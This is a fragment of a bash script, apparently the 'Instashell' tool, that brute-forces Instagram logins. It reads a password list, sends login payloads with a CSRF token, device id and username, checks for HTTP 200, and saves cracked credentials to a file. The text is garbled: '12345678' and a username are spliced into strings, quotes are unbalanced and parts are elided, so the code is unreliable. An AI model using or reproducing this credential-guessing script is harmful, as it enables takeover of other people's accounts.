...
read -p $'\e[1;92mPassword List:12345678
...
data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"kenswqq", "guid":"$guid", "device_id":"$device", "password":12345678"'$pass'", "login_attempt_count":"0"}'
...
#echo $check
if [[ "$check" == "200" ]]; then
printf "\e[1;92m [*] Password Found:12345678 $pass
printf "Username:kenswqq %s, Password:12345678 $user $pass >> found.instashell
...
printf "Username:kenswqq %s, Password:12345678 $pass >> found.instashell
printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"
exit 1
fi
